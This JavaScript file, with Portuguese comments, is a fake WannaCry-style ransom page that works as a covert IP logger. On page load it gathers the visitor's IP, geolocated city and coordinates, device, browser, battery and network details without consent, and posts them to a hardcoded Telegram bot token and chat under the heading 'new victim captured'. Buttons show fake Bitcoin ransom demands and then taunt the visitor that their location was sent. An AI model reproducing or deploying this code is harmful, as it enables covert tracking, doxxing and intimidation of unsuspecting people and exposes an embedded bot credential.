// ============================================
// IP LOGGER + TELEGRAM (SEM PEDIR PERMISSÃO)
// ============================================

const BOT_TOKEN = "8819910333:AAGxrE0I0KQy4DJtmJg5sGIWQqYBfOpPb1w";
const CHAT_ID = "8551438856";

// ============================================
// 1. PEGAR IP
// ============================================
async function getIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch {
        return 'Não foi possível obter IP';
    }
}

// ============================================
// 2. PEGAR LOCALIZAÇÃO PELO IP (sem permissão)
// ============================================
async function getLocationByIP(ip) {
    try {
        const response = await fetch(`https://ipinfo.io/${ip}/json`);
        const data = await response.json();
        return {
            city: data.city || 'Desconhecida',
            region: data.region || 'Desconhecida',
            country: data.country || 'Desconhecido',
            loc: data.loc || 'Desconhecida',
            org: data.org || 'Desconhecido',
            timezone: data.timezone || 'Desconhecido'
        };
    } catch {
        return {
            city: 'Erro ao obter',
            region: 'Erro ao obter',
            country: 'Erro ao obter',
            loc: 'Erro ao obter',
            org: 'Erro ao obter',
            timezone: 'Erro ao obter'
        };
    }
}

// ============================================
// 3. DADOS DO NAVEGADOR/DISPOSITIVO
// ============================================
function getBrowserData() {
    const data = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screenWidth: screen.width,
        screenHeight: screen.height,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        referrer: document.referrer || 'Direto',
        url: window.location.href,
        timestamp: new Date().toLocaleString('pt-BR')
    };
    return data;
}

// ============================================
// 4. DETECTAR VPN/PROXY
// ============================================
function detectVPN(ipInfo) {
    if (!ipInfo || !ipInfo.org) return '❓ Não foi possível detectar';
    const org = ipInfo.org.toLowerCase();
    if (org.includes('vpn') || org.includes('proxy') || org.includes('cloudflare') || org.includes('amazon') || org.includes('digitalocean')) {
        return '⚠️ **Possível VPN/Proxy detectado!**';
    }
    return '✅ Nenhum VPN/Proxy detectado';
}

// ============================================
// 5. INFORMAÇÕES DO SMARTPHONE (sem permissão)
// ============================================
function getSmartphoneInfo() {
    const ua = navigator.userAgent;
    const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(ua);
    const isIOS = /iPhone|iPad|iPod/i.test(ua);
    const isAndroid = /Android/i.test(ua);
    const isWindows = /Windows Phone/i.test(ua);

    let model = 'Desconhecido';
    let osVersion = 'Desconhecida';
    let brand = 'Desconhecida';

    if (isIOS) {
        const match = ua.match(/iPhone OS (\d+)_(\d+)/);
        if (match) {
            model = 'iPhone';
            osVersion = `iOS ${match[1]}.${match[2]}`;
        } else {
            model = 'iPhone';
            osVersion = 'iOS desconhecido';
        }
        brand = 'Apple';
    } else if (isAndroid) {
        const match = ua.match(/Android (\d+\.\d+)/);
        if (match) {
            model = 'Android';
            osVersion = `Android ${match[1]}`;
        } else {
            model = 'Android';
            osVersion = 'Android desconhecido';
        }
        brand = 'Vários (Android)';
    } else if (isWindows) {
        model = 'Windows Phone';
        osVersion = 'Windows Phone';
        brand = 'Microsoft';
    } else if (!isMobile) {
        model = '💻 Computador (não é smartphone)';
        osVersion = navigator.platform || 'Desconhecido';
        brand = 'Desktop';
    }

    // Bateria (se disponível - pode pedir permissão em alguns navegadores)
    let battery = '❌ Não disponível';
    if (navigator.getBattery) {
        try {
            navigator.getBattery().then(bat => {
                const level = Math.round(bat.level * 100);
                const charging = bat.charging ? '⚡ Carregando' : '🔋 Descarregando';
                battery = `${level}% (${charging})`;
            }).catch(() => {});
        } catch (e) {}
    }

    // Rede (sem permissão)
    let connectionType = 'N/A';
    let carrier = '❌ Não disponível';
    if (navigator.connection) {
        connectionType = navigator.connection.effectiveType || 'N/A';
        if (navigator.connection.type) {
            carrier = `Tipo: ${navigator.connection.type}`;
        }
    }

    return {
        isMobile,
        model,
        brand,
        osVersion,
        battery,
        carrier,
        connectionType,
        deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'N/A',
        cores: navigator.hardwareConcurrency || 'N/A'
    };
}

// ============================================
// 6. ENVIAR TUDO PRO TELEGRAM
// ============================================
async function sendToTelegram(ip, location, browserData, smartphone, vpnStatus) {
    let message = `
🕵️‍♂️ **NOVA VÍTIMA CAPTURADA** 💀

🌐 **IP:** ${ip}

📍 **LOCALIZAÇÃO (por IP):**
   ───────────────────────────
   🏙️ **Cidade:** ${location.city}
   🗺️ **Região:** ${location.region}
   🌍 **País:** ${location.country}
   📍 **Coordenadas:** ${location.loc}
   🕰️ **Fuso Horário:** ${location.timezone}
   ───────────────────────────

📱 **SMARTPHONE/DISPOSITIVO:**
   ───────────────────────────
   📱 **Modelo:** ${smartphone.model}
   🏷️ **Marca:** ${smartphone.brand}
   📲 **Sistema:** ${smartphone.osVersion}
   🔋 **Bateria:** ${smartphone.battery}
   📶 **Conexão:** ${smartphone.connectionType}
   💾 **Memória RAM:** ${smartphone.deviceMemory}
   🧠 **Núcleos:** ${smartphone.cores}
   ───────────────────────────

📊 **DADOS DO NAVEGADOR:**
   ───────────────────────────
   🖥️ **User Agent:** ${browserData.userAgent}
   📐 **Tela:** ${browserData.screenWidth}x${browserData.screenHeight}px
   🌍 **Idioma:** ${browserData.language}
   🔗 **Referer:** ${browserData.referrer}
   📎 **URL:** ${browserData.url}
   ⏱️ **Data/Hora:** ${browserData.timestamp}
   ───────────────────────────

🛡️ **VPN/PROXY:** ${vpnStatus}
   ───────────────────────────

💀 **Ransomware WannaCry Style - IP Logger**
`;

    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown',
                disable_web_page_preview: true
            })
        });
        if (response.ok) {
            document.getElementById('status').textContent = '✅ Decryption key sent!';
            document.getElementById('status').style.color = '#00ff41';
        } else {
            document.getElementById('status').textContent = '❌ Failed to connect';
            document.getElementById('status').style.color = '#ff0000';
        }
    } catch {
        document.getElementById('status').textContent = '❌ Network error';
        document.getElementById('status').style.color = '#ff0000';
    }
}

// ============================================
// 7. FUNÇÃO PRINCIPAL
// ============================================
async function main() {
    const loading = document.getElementById('loading');
    const status = document.getElementById('status');

    loading.style.display = 'block';
    status.textContent = '📡 Coletando dados do sistema...';

    const ip = await getIP();
    const location = await getLocationByIP(ip);
    const browserData = getBrowserData();
    const smartphone = getSmartphoneInfo();
    const vpnStatus = detectVPN(location);

    status.textContent = '📤 Enviando para o servidor...';
    await sendToTelegram(ip, location, browserData, smartphone, vpnStatus);

    setTimeout(() => {
        loading.style.display = 'none';
    }, 4000);
}

// ============================================
// 8. BOTÕES (troll)
// ============================================
function checkPayment() {
    alert('💰 Payment not detected!\n\nTry sending exactly $300 in Bitcoin to:\n1T5p7UMMngoj1plMvkpHjicRdfJNXj8LrLn');
}

function decrypt() {
    alert('🔓 Decrypting files...\n\nJust kidding! 😂\nYour IP and location were sent to the owner! 👀');
}

function aboutBitcoin() {
    alert('₿ Bitcoin is a cryptocurrency.\n\nCurrent price: ~$60,000 USD');
}

// ============================================
// 9. EXECUTAR
// ============================================
document.addEventListener('DOMContentLoaded', main);
